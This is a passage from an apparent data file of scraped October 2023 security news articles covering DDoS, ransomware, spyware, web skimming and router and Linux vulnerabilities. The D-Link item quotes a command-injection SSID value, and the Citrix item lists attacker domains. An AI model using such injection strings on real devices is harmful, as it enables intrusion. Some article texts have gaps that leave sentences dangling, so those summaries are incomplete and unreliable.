      "time": "2023-10-11",
      "title": "New 'HTTP/2 Rapid Reset' zero-day attack breaks DDoS records",
      "text": " A new DDoS (distributed denial of service) technique named 'HTTP/2 Rapid Reset' has been actively exploited as a zero-day since August, breaking all previous records in magnitude.News of the zero-day technique comes as a coordinated announcement today between Amazon Web Services, Cloudflare, and Google, who report mitigating attacks reaching 155 million requests per second (Amazon), 201 million rps (Cloudflare), and a record-breaking 398 million rps (Google).Cloudflare comments that the size of the attack it mitigated is three times bigger than its previous record, from February 2023 (71 million rps), and it's alarming that this was achieved using a relatively small botnet comprising 20,000 machines.Since late August, Cloudflare has detected and mitigated over a thousand 'HTTP/2 Rapid Reset' DDoS attacks that surpassed 10 million rps, with 184 breaking the previous 71 million rps record.Cloudflare is confident that as further threat actors employ more expansive botnets along with this new attack method, HTTP/2 Rapid Reset attacks will continue to break even greater records.\"Given that the entire web typically sees only between 1–3 billion requests per second, it's not inconceivable that using this method could focus an entire web's worth of requests on a small number of targets.\"The novel attack exploits a zero-day vulnerability tracked as CVE-2023-44487, which abuses a weakness in the HTTP/2 protocol.Simply put, the attack method abuses HTTP/2's stream cancellation feature to continuously send and cancel requests, overwhelming the target server/application and imposing a DoS state.HTTP/2 features a safeguard in the form of a parameter that limits the number of concurrently active streams to prevent DoS attacks; however, this isn't always effective.The protocol developers introduced a more efficient measure called \"request cancelation,\" which doesn't tear down the whole connection but which can be abused.Malicious actors have been abusing this feature since late August to send a flurry of HTTP/2 requests and resets (RST_Stream frames) on a server, asking it to process each of them and perform rapid resets, overwhelming its capacity to respond to new incoming requests.\"The client may also assume that the cancellation will take effect immediately when the server receives the RST_STREAM frame, before any other data from that TCP connection is processed.\"Cloudflare explains that HTTP/2 proxies or load-balancers are particularly susceptible to those long strings of reset requests sent quickly.The firm's network was overwhelmed at the point between the TLS proxy and its upstream counterpart, so the damage was done before the bad requests reached the block point.In terms of real-world impact, these attacks have caused an increase in 502 error reports among Cloudflare's clients.Cloudflare says it eventually mitigated these attacks using a system designed to handle hyper-volumetric attacks called 'IP Jail,' which the internet firm expanded to cover its entire infrastructure.This system \"jails\" offending IPs and bars them from using HTTP/2 for any Cloudflare domain for a period of time while impacting legitimate users sharing the jailed IP with a minor performance drop.All three firms conclude that the best approach for clients to counter HTTP/2 Rapid Reset attacks is to use all available HTTP-flood protection tools and bolster their DDoS resilience with multifaceted mitigations.Unfortunately, as this tactic abuses the HTTP/2 protocol, there is no general fix that entirely blocks attackers from using this DDoS technique.Instead, software developers who utilize the protocol in their software are implementing rate controls to mitigate HTTP/2 Rapid Reset attacks.In a separate post, Cloudflare explains that they had to keep the zero-day secret for over a month to allow security vendors and stakeholders time to react to the threat before it's made known to more threat actors and the \"cat and mouse\" game begins.\"However, at some point, the responsible thing becomes to publicly disclose zero-day threats like this. Today is that day.\""
   },
   {
      "time": "2023-10-10",
      "title": "HelloKitty ransomware source code leaked on hacking forum",
      "text": " A threat actor has leaked the complete source code for the first version of the HelloKitty ransomware on a Russian-speaking hacking forum, claiming to be developing a new, more powerful encryptor.While the source code was released by someone named 'kapuchin0,' 3xp0rt told BleepingComputer that the threat actor also utilizes the alias 'Gookee.'3xp0rt believes kapuchin0/Gookee is the developer of the HelloKitty ransomware, who now says, \"We are preparing a new product and much more interesting than Lockbit.\"Ransomware expert Michael Gillespie confirmed to BleepingComputer that this is the legitimate source code for HelloKitty used when the ransomware operation first launched in 2020.While the release of ransomware source code can be helpful for security research, the public availability of this code does have its drawbacks.The gang is known for hacking corporate networks, stealing data, and encrypting systems. The encrypted files and stolen data are then utilized as leverage in double-extortion machines, where the threat actors threaten to leak data if a ransom is not paid.However, as the encryptor has changed over time, these IOCs have likely become outdated."
   },
   {
      "time": "2023-10-10",
      "title": "ALPHV ransomware gang claims attack on Florida circuit court",
      "text": " The ALPHV (BlackCat) ransomware gang has claimed an attack that affected state courts across Northwest Florida (part of the First Judicial Circuit) last week.Allegedly, the threat actors have acquired personal details like Social Security numbers and CVs of employees, including judges.Additionally, ALPHV claims to possess a comprehensive network map of the court's systems, complete with local and remote service credentials.Ransomware gangs commonly threaten to leak stolen data online to coerce victims into negotiation or reopening discussions.The presence of Florida's First Judicial Circuit's data leak page on ALPHV's website suggests that the court has either not engaged in negotiations with the ransomware operation or has firmly declined to meet the gang's demands.The Florida circuit court disclosed last week that it was investigating a cyberattack that disrupted its operations on Monday morning, October 2nd.\"The Circuit is prioritizing essential court proceedings but will cancel and reschedule other proceedings and pause related operations for several days, beginning Monday, October 2, 2023.\"Amid the ongoing investigation into the attack, judges in the four counties have been communicating with litigants and attorneys regarding their weekly scheduled hearings.Additionally, the court authorities confirmed that all facilities continue operating without disruptions. The court has not yet verified the ransomware attack claims made by the ALPHV gang.This ransomware operation is known for consistently targeting global enterprises and continuously adapting and refining their tactics."
   },
   {
      "time": "2023-10-10",
      "title": "Over 17,000 WordPress sites hacked in Balada Injector attacks last month",
      "text": " Multiple Balada Injector campaigns have compromised and infected over 17,000 WordPress sites using known flaws in premium theme plugins.The backdoor redirects visitors of the compromised websites to fake tech support pages, fraudulent lottery wins, and push notification scams, so it is either part of scam campaigns or a service sold to scammers.The threat actors leverage the CVE-2023-3169 cross-site scripting (XSS) flaw in tagDiv Composer, a companion tool for tagDiv's Newspaper and Newsmag themes for WordPress sites.The two are premium (paid) themes, often used by thriving online platforms that maintain healthy operations and garner significant traffic.This plugin allowed the threat actors to remotely send PHP code that would be saved to the /tmp/i file and executed. The attacks were also marked by code being injected into templates that would redirect users to scam sites under the attacker's control.At the time, a tagDiv representative confirmed they were aware of the flaw and told people to install the latest theme to prevent the attacks.\"Besides updating the theme, the recommendation is to immediately install a security plugin such as wordfence, and scan the website. Also change all the website passwords.\"A characteristic sign of CVE-2023-3169 exploitation is a malicious script injected within specific tags, while the obfuscated injection itself can be found in the 'wp_options' table of the website's database.Sucuri has observed six distinct attack waves, some of which have variants, too, and which are summarized below:In general, Sucuri says it detected Balada Injector on over 17,000 WordPress sites in September 2023, with more than half (9,000) achieved by exploiting CVE-2023-3169.The attack waves were swiftly optimized, indicating that the threat actors can rapidly adapt their techniques to achieve maximum impact.To defend against Balada Injector, it is recommended to upgrade the tagDiv Composer plugin to version 4.2 or later, which addresses the mentioned vulnerability.Also, keep all your themes and plugins updated, remove dormant user accounts, and scan your files for hidden backdoors."
   },
   {
      "time": "2023-10-10",
      "title": "Patch Now: Massive RCE Campaign Wrangles Routers Into Botnet",
      "text": " Nimble and able to pivot on the fly to take advantage of emerging vulnerabilities, a campaign named IZ1H9 has ramped up its malware development to target a range of unpatched router and Internet of Things (IoT) devices and add them to a widening botnet used to launch targeted distributed denial-of-service (DDoS) cyberattacks.Researchers from FortiGuard Labs flagged the campaign, which was recently updated with 13 new payloads leveraging known vulnerabilities in D-Link devices; Netis wireless routers; Sunhillo SureLine; Geutebruck IP cameras; and Yealink Device Management, Zyxel devices, TP-Link Artcher, Korenix Jetwave, and Totolink routers.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-10",
      "title": "D-Link WiFi range extender vulnerable to command injection attacks",
      "text": " The popular D-Link DAP-X1860 WiFi 6 range extender is susceptible to a vulnerability allowing DoS (denial of service) attacks and remote command injection.The product is currently listed as available on D-Link's site and has thousands of reviews on Amazon, so it's a popular choice among consumers.A team of German researchers (RedTeam) who discovered the vulnerability, tracked as CVE-2023-45208, report that despite their attempts to alert D-Link multiple times, the vendor has remained silent, and no fixes have been released.The problem lies in the network scanning functionality of D-Link DAP-X1860, specifically, the inability to parse SSIDs containing a single tick (') in the name, misinterpreting it as a command terminator.Technically, the problem originates from the 'parsing_xml_stasurvey' function in the libcgifunc.so library, which contains a system command for execution.However, given the product's lack of SSID sanitization, an attacker can easily abuse this feature for malicious purposes.An attacker within the extender's range can set up a WiFi network and deceptively name it similar to something the target is familiar with but include a tick in the name, like 'Olaf's Network,' for example.When the device attempts to connect to that SSID, it will produce an \"Error 500: Internal Server Error\", failing to operate normally.If the attacker adds a second section to the SSID that contains a shell command separated by \"&&\" like \"Test' && uname -a &&\", the extender will be tricked to execute the 'uname -a' command upon setup/network scan.All processes on the extender, including any commands injected by external threat actors, are run with root privileges, potentially allowing the attackers to probe other devices connected to the extender and further their network infiltration.Several readily available software tools can generate and send deauth packets to the extender, causing it to disconnect from its main network and forcing the target to perform a network scan.This means that D-Link DAP-X1860 is still vulnerable to attacks, and the relatively simple exploitation mechanism makes the situation risky.Owners of DAP-X1860 extenders are recommended to limit manual network scans, treat sudden disconnections suspiciously, and turn off the extender when not actively used.Also, consider placing IoT devices and range extenders on a separate network isolated from sensitive devices holding personal or work data."
   },
   {
      "time": "2023-10-10",
      "title": "Hackers hijack Citrix NetScaler login pages to steal credentials",
      "text": " Hackers are conducting a large-scale campaign to exploit the recent CVE-2023-3519 flaw in Citrix NetScaler Gateways to steal user credentials.IBM's X-Force reports that despite the multiple warnings to update Citrix devices, the attack surface remains significant, and hackers began exploiting CVE-2023-3519 to inject JavaScript that harvests login credentials in September.X-Force first discovered the Netscaler credential-stealing campaign while investigating a case where a client experienced slow authentications on their NetScaler device.Based on their investigations, the responders found that hackers breached using CVE-2023-3519 to inject a malicious credential-stealing JavaScript script into a Citrix NetScaler device's index.html login page.The attack begins with a web request that exploits vulnerable NetScaler devices to write a simple PHP web shell on \"/netscaler/ns_gui/vpn.\"This web shell gives the attackers direct real-time access to the compromised endpoint, which they leverage to gather configuration data from the \"ns.conf\" file.Next, the attackers append custom HTML code onto the \"index.html\" file that references a remote JavaScript file, which in turn fetches and executes additional JS code.That last JS snippet is designed for credential collection, attaching a custom function to the \"Log On\" button on the VPN authentication page.Eventually, the collected credentials are exfiltrated to the attackers via an HTTP POST request.The threat actor registered several domains for this campaign, including jscloud[.]ink, jscloud[.]live, jscloud[.]biz, jscdn[.]biz, and cloudjs[.]live.X-Force identified almost 600 unique IP addresses for NetScaler devices whose login pages had been modified to facilitate the credential-stealing operation.Most victims are located in the United States and Europe, but compromised systems are worldwide.Regarding the campaign's duration, X-Force's report mentions that the earliest login page modification based on the retrieved timestamps is August 11, 2023, so the campaign has been underway for two months.IBM's analysts were unable to attribute this activity to any threat group or known clusters but retrieved a new artifact from the attack that could help defenders detect it early.The artifact can be found in the NetScaler application crash logs associated with the NetScaler Packet Processing Engine (NSPPE), which are located in \"/var/core/<number>/NSPPE*.\"\"In other instances, X-Force was able to recover commands being passed to the web shells as part of post-exploitation activities.\"The crash files are stored in \".gz\" archives that require extraction before analysis, while their string data contents also need to be converted to readable form using PowerShell or other tools."
   },
   {
      "time": "2023-10-10",
      "title": "Operation Behind Predator Mobile Spyware Is 'Industrial Scale'",
      "text": " The recent surge in Predator spyware is the result of a widespread and entrenched grey-area commercial operation that trades surveillance operations \"at industrial scale.\"That's according to an analysis by Amnesty International's Security Labs of data gathered by the European Investigative Collaboration (EIC) media network, which has unearthed new information on how the actors behind the shadowy Predator mobile surveillance tool deliver it to target Android and iOS devices.\"Intellexa alliance's products have been found in at least 25 countries across Europe, Asia, the Middle East and Africa, and have been used to undermine human rights, press freedom, and social movements across the globe,\" Amnesty International said. \"The 'Predator Files' investigation shows what we have long feared: that highly invasive surveillance products are being traded on a near industrial scale and are free to operate in the shadows without oversight or any genuine accountability.\"The Amnesty International report highlights five technologies — and lists several others — that Intellexa has used over the years to help its government and law enforcement clients silently install Predator on mobile devices belonging to persons of interest.On top of the list is Mars, a network injection system installed at mobile ISP locations. The technology allows Intellexa customers to quietly redirect target users to a Pegasus infection server when they browse any HTTP Web page. For the technology to work, mobile ISPs need to install Mars on their network, assign a static IP to the target subscriber and set up rules for forwarding traffic from the target IP address to the Mars system. \"The network injection system can respond to the original HTTP request with a HTTP redirect containing a 1-click browser exploit link which infects the device without further user action,\" the report noted.Intellexa offers an add-on product to Mars called Jupiter that its customers can use to do similar network injection into encrypted HTTPS traffic. In this case however, the injection only works with websites hosted in the target user's country. As with the Mars product, customers have to convince mobile ISPs to install Jupiter hardware on their networks. The technology basically enables Intellexa customers to insert themselves in the middle of HTTPS requests sent from the target user to a local HTTPS website and inject Predator.Another tool that Amnesty highlighted in its report is Triton, a product that Intellexa has positioned as something that customers can use to infect Samsung devices — including the latest models running the most recent versions of Android. \"The system appears to target vulnerabilities in baseband software used in Samsung devices which allows infection with the Predator spyware with 'no interaction with the target' or the need for the target to use a browser or any other app.\" The Triton attack chain involves the malware first using a so-called IMSI catcher to downgrade Samsung devices from 5G, 4G, and 3G to the old 2G protocol. Once that happens, Triton uses what appears to be an integrated software defined base station to deliver the payload, the Amnesty report noted.The other Intellexa tools that the Amnesty report highlights include SpearHead, a range of Wi-Fi interception and infection products that operators can carry James-Bond-like on a briefcase, in a surveillance van on a drone. The technology from Intellexa alliance partner WiSpear allows for target identification, geolocation monitoring, traffic interception and payload delivery. Other tools include a 3G/4G GSM interception and infection product called Alpha-Max from Nexa group and Jasmine a product for deanonymizing encrypted WhatsApp and Signal traffic using metadata analysis.Intellexa has often bundled these technologies to offer an end-to-end surveillance capability for governments and law-enforcement agencies. An Intellexa price proposal that EIC investigators obtained showed the company offering a full range of remote data extraction services from Android and iOS devices for 8 million Euros. The price includes one-click exploits for delivering Predator on Android and iOS devices, the ability to monitor up to 10 targets concurrently, analysis of all data extracted from target systems, and a 12-month warranty.Microsoft, which released a 128-page digital defense report this week has one section on the emerging threat to organizations posed by cyber mercenary groups, of which Intellexa would be one. The company describes them as private sector offensive actors.\"Cyber mercenaries, as they're called sometimes in the policy world, dot the landscape,\" says Sherrod DeGrippo, director of threat intelligence strategy at Microsoft. \"I think it's something that we're going to have to continue watching because these are the entities that supply nation states with their technical capabilities to carry out destructive actions.\"DeGrippo perceives the sector as a bit of a gray area that is only going to continue to evolve and grow, because of the potential for significant financial gain. \"We have to commit to making sure that we are thinking about this threat, tracking this as a threat, making sure that we protect our customers and individuals from these kinds of threats and being, in some ways, threat landscape agnostic.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-10",
      "title": "GNOME Linux systems exposed to RCE attacks via file downloads",
      "text": " A memory corruption vulnerability in the open-source libcue library can let attackers execute arbitrary code on Linux systems running the GNOME desktop environment.libcue, a library designed for parsing cue sheet files, is integrated into the Tracker Miners file metadata indexer, which is included by default in the latest GNOME versions.Cue sheets (or CUE files) are plain text files containing the layout of audio tracks on a CD, such as length, name of song, and musician, and are also typically paired with the FLAC audio file format.GNOME is a widely used desktop environment across various Linux distributions such as Debian, Ubuntu, Fedora, Red Hat Enterprise, and SUSE Linux Enterprise.Attackers can successfully exploit the flaw in question (CVE-2023-43641) to execute malicious code by taking advantage of Tracker Miners automatically indexing all downloaded files to update the search index on GNOME Linux devices.In order to exploit this vulnerability, the targeted user must download a maliciously crafted .CUE file, which is then stored in the ~/Downloads folder.The memory corruption flaw is triggered when the Tracker Miners metadata indexer parses the saved file automatically via the tracker-extract process.\"To make a long story short, that means that inadvertently clicking a malicious link is all it takes for an attacker to exploit CVE-2023-43641 and get code execution on your computer,\" Backhouse said.While the PoC exploit needs to be tweaked to work properly for each Linux distro, the researcher said that he had already created exploits targeting the Ubuntu 23.04 and Fedora 38 platforms that work \"very reliably.\"\"In my testing, I have found that the PoC works very reliably when run on the correct distribution (and will trigger a SIGSEGV when run on the wrong distribution),\" Backhouse said.\"I have not created PoCs for any other distributions, but I believe that all distributions that run GNOME are potentially exploitable.\"While successful exploitation of CVE-2023-43641 requires tricking a potential victim into downloading a .cue file, ​admins are advised to patch systems and mitigate the risks posed by this security flaw, as it provides code execution on devices running the latest releases of widely used Linux distros, including Debian, Fedora, and Ubuntu."
   },
   {
      "time": "2023-10-10",
      "title": "Hackers modify online stores’ 404 pages to steal credit cards",
      "text": " A new Magecart card skimming campaign hijacks the 404 error pages of online retailer's websites, hiding malicious code to steal customers' credit card information.This technique is one of the three variants observed by researchers of the Akamai Security Intelligence Group, with the other two concealing the code in the HTML image tag's 'onerror' attribute and an image binary to make it appear as the Meta Pixel code snippet.Akamai says the campaign focuses on Magento and WooCommerce sites, with some victims linked to renowned organizations in the food and retail sectors.All websites feature 404 error pages that are displayed to visitors when accessing a webpage that does not exist, has been moved, or has a dead/broken link.The Magecart actors leverage the default '404 Not Found' page to hide and load the malicious card-stealing code, which hasn't been seen before in previous campaigns.\"The idea of manipulating the default 404 error page of a targeted website can offer Magecart actors various creative options for improved hiding and evasion.\"The skimmer loader either disguises itself as a Meta Pixel code snippet or hides within random inline scripts already present on the compromised checkout web page.The loader initiates a fetch request to a relative path named 'icons,' but as this path does not exist on the website, the request results in a \"404 Not Found\" error.Akamai's investigators initially assumed the skimmer was no longer active or the Magecart group had made a configuration mistake. However, upon closer inspection, they found that the loader contained a regular expression match searching for a specific string in the returned HTML of the 404 page.Upon locating the string on the page, Akamai found a concatenated base64-encoded string concealed in a comment. Decoding that string revealed the JavaScript skimmer, which hides in all 404 pages.\"We simulated additional requests to nonexistent paths, and all of them returned the same 404 error page containing the comment with the encoded malicious code,\" explains Akamai\"These checks confirm that the attacker successfully altered the default error page for the entire website and concealed the malicious code within it!\"Because the request is made to a first-party path, most security tools monitoring suspicious network requests on the checkout page would overlook it.The skimmer code displays a fake form that the website visitors are expected to fill out with sensitive details, including their credit card number, expiration date, and security code.Once this data is entered on the bogus form, the victim gets a fake \"session timeout\" error.In the background, all information is base64-encoded and sent to the attacker via an image request URL carrying the string as a query parameter.This approach helps evade detection by network traffic monitoring tools, as the request looks like a benign image fetch event. However, decoding the base64 string reveals personal and credit card information.The case of manipulating 404 pages highlights the evolving tactics and versatility of Magecart actors, who continually make it harder for webmaster to locate their malicious code on compromised websites and sanitize them."
   },
   {
      "time": "2023-10-10",
      "title": "'Looney Tunables' Linux Flaw Sees Snowballing Proof-of-Concept Exploits",
      "text": " The flaw, disclosed by Qualys researchers, poses a significant risk of unauthorized data access, system alterations, and potential data theft for systems running Fedora, Ubuntu, Debian, and several other major Linux distributions, potentially granting attackers root privileges on countless Linux systems.The Qualys write-up noted that in addition to successfully exploiting the vulnerability and obtaining full root privileges on the default installations of Fedora 37 and 38, Ubuntu 22.04 and 23.04, Debian 12 and 13, other distributions were also likely vulnerable and exploitable.\"This tangible threat to system and data security, coupled with the possible incorporation of the vulnerability into automated malicious tools or software such as exploit kits and bots, escalates the risk of widespread exploitation and service disruptions,\" Saeed Abbasi, product manager at Qualys' Threat Research Unit, announced last week as the flaw was revealed.Linux root takeovers can be highly dangerous because they provide attackers with the highest level of control over a Linux-based system, and root access facilitates privilege escalation across the network, which can compromise additional systems, this expanding the scope of the attack.If attackers gain root access, they essentially have unrestricted authority to modify, delete, or exfiltrate sensitive data, install malicious software or backdoors into the system, perpetuating ongoing attacks that remain undetected for extended periods.Root takeovers in general often lead to data breaches, allowing unauthorized access to sensitive information like customer data, intellectual property, and financial records, and attackers can disrupt business operations by tampering with crucial system files.This disruption of critical system operations often results in service outages or hamstringing productivity, resulting in financial losses and damage to the organization's reputation.Organizations have multiple options to take to proactively protect themselves from Linux root takeovers — for example, regular patching and updating of the Linux operating system and software and enforcing the least privilege principle to restrict access.Other options include deploying intrusion detection and prevention systems (IDS/IPS) and strengthening access controls bolstered by multifactor authentication (MFA), as well as monitoring system logs and network traffic and conducting security audits and vulnerability assessments.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-09",
      "title": "D.C. Board of Elections confirms voter data stolen in site hack",
      "text": " The District of Columbia Board of Elections (DCBOE) is currently probing a data leak involving an unknown number of voter records following breach claims from a threat actor known as RansomedVC.DCBOE operates as an autonomous agency within the District of Columbia Government and is entrusted with overseeing elections, managing ballot access, and handling voter registration processes.Its investigation into the claims has revealed that the attackers accessed the information through the web server of DataNet Systems, the hosting provider for Washington D.C.'s election authority. Notably, the breach did not involve a direct compromise of DCBOE's servers and internal systems.\"On 10/5, DCBOE became aware of cybersecurity incident involving DC voter records. While the incident remains under investigation, DCBOE's internal databases & servers were not compromised,\" the agency said.In close cooperation with MS-ISAC's Computer Incident Response Team (CIRT), DCBOE took down its website and replaced it with a maintenance page to contain the situation after identifying it as the source of the breach.Since the discovery of the incident, the election board worked with data security experts, the Federal Bureau of Investigation (FBI), and the Department of Homeland Security (DHS) to conduct a comprehensive security assessment of its internal systems.Additionally, DCBOE initiated vulnerability scans across its database, server, and IT networks to identify potential security issues that might have facilitated the attackers' access to the stolen information.RansomedVC alleges that the recent incident resulted in the theft of over 600,000 lines of U.S. voter data, encompassing records of D.C. voters. \"We have successfully breached the District of Columbia Board Of Elections and have gotten more than 600k lines of USA Voters,\" the threat actor says.The stolen information is currently being offered for sale on the threat actor's dark web leak site, but the exact price is undisclosed.As verification of the data's authenticity, RansomedVC has provided a single record containing what it claims to be the personal details of a Washington D.C. voter. This dataset includes the individual's name, registration ID, voter ID, partial Social Security number, driver's license number, date of birth, phone number, email, and more.\"It should be noted that in the District of Columbia, some voter registration data-such as voter names, addresses, voting records, and party affiliation-is public information, unless it has been made confidential in accordance with District of Columbia rules and regulations,\" the Washington election authority said in its statement.However, election authorities do not provide access to confidential information such as voters' contact information and SSNs.While RansomedVC has claimed the breach and is now selling the data on their leak site, an anonymous source told BleepingComputer on October 3rd that DCBOE's stolen database was first put up for sale on the BreachForums and Sinister.ly hacking forums by a user named pwncoder (those posts have since been deleted).As BleepingComputer was told, the data was dumped from a stolen MSSQL database and contained the information of more than 600,000 D.C. voters.The latter party released a 2.4 GB archive of files on BreachForums, allegedly taken from Sony's systems.While the data shared by these attackers seems linked to Sony, BleepingComputer could not independently validate the authenticity of either party's claims."
   },
   {
      "time": "2023-10-09",
      "title": "Microsoft 365 admins warned of new Google anti-spam rules",
      "text": " Microsoft 365 email senders were warned by Microsoft this week to authenticate outbound messages, a move prompted by Google's recent announcement of stricter anti-spam rules for bulk senders.\"By setting up email authentication for your domain, you can ensure that your messages are less likely to be rejected or marked as spam by email providers like Gmail, Yahoo, AOL, Outlook.com,\" the Microsoft Defender for Office 365 team said.\"This is especially important when sending bulk email (large volume email), as it helps maintain the deliverability and reputation of your email campaigns.\"Failure to follow newly announced email authentication standards might lead to emails being rejected or tagged as spam.Those who want to send bulk emails should use their own on-premises email servers or third-party mass mailing providers, which will help ensure good email-sending practices.However, Microsoft cautioned that even \"following these recommendations does not guarantee delivery. If your email is rejected as bulk, send it through on-premises or a third-party provider instead.\"Starting February 1st, 2024, Google will mandate senders exceeding this threshold to implement SPF/DKIM and DMARC email authentication for their domains. This measure aims to bolster defenses against email spoofing and phishing attempts.Furthermore, bulk senders must provide Gmail recipients with a one-click option to unsubscribe from commercial emails and promptly address unsubscription requests within two days.As part of these efforts to combat spam, Google said it will also closely monitor spam thresholds and, in cases where abusive bulk senders are identified, it will mark their emails as spam to protect users from unsolicited and potentially harmful messages. \"If you don't meet the requirements [..], your email might not be delivered as expected, or might be marked as spam,\" Google warned."
   },
   {
      "time": "2023-10-09",
      "title": "Third Flagstar Bank data breach since 2021 affects 800,000 customers",
      "text": " Flagstar Bank is warning that over 800,000 US customers had their personal information stolen by cybercriminals due to a breach at a third-party service provider.Flagstar, now owned by the New York Community Bank, is a Michigan-based financial services provider that, before its acquisition last year, was one of the largest banks in the United States, having total assets of over $31 billion.The total number of Flagstar Bank customers impacted by this incident is 837,390 in the United States.Based on the data samples posted by the ransomware gang, the hackers managed to steal customer and employee information, including names, addresses, phone numbers, tax records, and SSNs.The data compromised in that incident includes at least names and Social Security Numbers. At the time, the company opted again to censor the relevant section on the published notification samples.BleepingComputer has contacted Fiserv to ask if the MOVEit breach affects more financial institutions and their customers, and we will update this post as soon as we receive a response."
   },
   {
      "time": "2023-10-09",
      "title": "Supermicro's BMC Firmware Found Vulnerable to Multiple Critical Vulnerabilities",
      "text": " A brief explainer of each of the vulnerabilities is below -\"This privilege allows to make the attack persistent even while the BMC component is rebooted and to move laterally within the compromised infrastructure, infecting other endpoints.\"The other six vulnerabilities – CVE-2023-40284, CVE-2023-40287, and CVE-2023-40288 in particular – could be used to create an account with admin privileges for the web server component of the BMC IPMI software.As a result, a remote attacker looking to take control of the servers could combine them with CVE-2023-40289 to perform command injection and achieve code execution. In a hypothetical scenario, this could play in the form of sending a phishing email bearing a booby-trapped link to the administrator's email address that, when clicked, triggers the execution of the XSS payload.There is presently no evidence of any malicious exploitation of the vulnerabilities in the wild, although Binarly said it observed more than 70,000 instances of internet-exposed Supermicro IPMI web interfaces at the start of October 2023.\"First, it is possible to remotely compromise the BMC system by exploiting vulnerabilities in the Web Server component exposed to the internet,\" the firmware security company explained.\"An attacker can then gain access to the Server's operating system via legitimate iKVM remote control BMC functionality or by flashing the UEFI of the target system with malicious firmware that allows persistent control of the host OS. From there, nothing prevents an attacker from lateral movement within the internal network, compromising other hosts.\"Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-09",
      "title": "QakBot Threat Actors Still in Action, Using Ransom Knight and Remcos RAT in Latest Attacks",
      "text": " Despite the disruption to its infrastructure, the threat actors behind the QakBot malware have been linked to an ongoing phishing campaign since early August 2023 that led to the delivery of Ransom Knight (aka Cyclops) ransomware and Remcos RAT.The activity has been attributed with moderate confidence by the cybersecurity firm to QakBot affiliates. There is no evidence to date that the threat actors have resumed distributing the malware loader itself post-infrastructure takedown.The ZIP archives containing the LNK files have also been observed incorporating Excel add-in (.XLL) files to propagate the Remcos RAT, which facilitates persistent backdoor access to the endpoints.Some of the file names being used in the campaign are written in Italian, which suggests the attackers are targeting users in that region.\"Though we have not seen the threat actors distributing Qakbot post-infrastructure takedown, we assess the malware will likely continue to pose a significant threat moving forward,\" Venere said.\"Given the operators remain active, they may choose to rebuild Qakbot infrastructure to fully resume their pre-takedown activity.\"\"Identifying the true scope is difficult but as we've already seen the QakBot distribution network is highly effective and has the ability to push large scale campaigns,\" Venere told the publication. \"We have observed phishing emails distributing these malware to Italian, German, and English victims which shows the campaign is widespread.\"Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-09",
      "title": "Blackbaud agrees to $49.5 million settlement for ransomware data breach",
      "text": " Cloud computing provider Blackbaud reached a $49.5 million agreement with attorneys general from 49 U.S. states to settle a multi-state investigation of a May 2020 ransomware attack and the resulting data breach.Blackbaud is a leading provider of software solutions catering to nonprofit organizations, such as charities, schools, and healthcare agencies, and it specializes in donor engagement and management of constituency data.This data includes a wide array of sensitive information such as demographic details, Social Security numbers, driver's license numbers, financial records, employment data, wealth information, donation histories, and protected health information.In the breach disclosed by Blackbaud in July 2020, the highly sensitive data belonging to over 13,000 Blackbaud business customers and their clients from the U.S., Canada, the U.K., and the Netherlands was compromised, impacting millions of individuals.As part of the settlement, Blackbaud also has to:According to the SEC, Blackbaud's technology and customer relations personnel discovered the attackers stole donor bank account information and social security numbers. However, they didn't escalate the matter to management due to the company's lack of appropriate disclosure controls and procedures.Subsequently, Blackbaud submitted an SEC report omitting crucial details about the full scope of the breach. Additionally, the report downplayed the potential risk associated with sensitive donor information accessed by the attackers, describing it as hypothetical."
   },
   {
      "time": "2023-10-09",
      "title": "UK and Japan space agencies team for orbital network • The Register",
      "text": " The UK Space Agency (UKSA) and Japan Aerospace Exploration Agency (JAXA) have teamed to build an in-orbit telemetry relay service named InRange to assist Japan's latest launch rocket, the H3.JAXA added that in some cases, the telemetry relay service will reduce the fuel needed to place a spacecraft in orbit, increasing payload capacity.UKSA chief executive Paul Bate noted that the move will reduce the pressure placed on ground-based systems.\"The InRange service will increase the flexibility of the H3's flight trajectories, and that will enable the H3 to meet the diverse needs of the launch customers. We will step up our efforts so as to successfully deliver the second test flight and will continue to promote the development of the H3 by realizing this project,\" summarized JAXA H3 project manager Masashi Okada.The telemetry service will use Inmarsat-Viasat's geostationary ELERA L-band satellite network, in a $2 million-plus (£1.7 million) deal. JAXA will provide the transmitter and the antenna development, and also play a technical role in integrating the service into ground infrastructure.Japanese vendor NEC Space Technologies will assist in the L-band transmitter design, which Mitsubishi Heavy Industries (MHI) will integrate into the H3 launch vehicle.Viasat and H3 manufacturer MHI will together validate the InRange service – proving it all works once the rocket launches.The H3 vehicle is intended to replace the H-IIA, which has served JAXA for over 20 years and is scheduled to be make just three more launches.The new rocket is ten years in the making. It is also modular, expendable, and designed to be launched independently or with the assistance of two or four solid fuel boosters. It is expected to halve the cost the H-IIA's launch costs.The Register   Biting the hand that feeds IT\n                        Copyright. All rights reserved © 1998–2023\n\n                    "
   },
   {
      "time": "2023-10-09",
      "title": "Critical Atlassian Confluence bug under attack. Patch now • The Register",
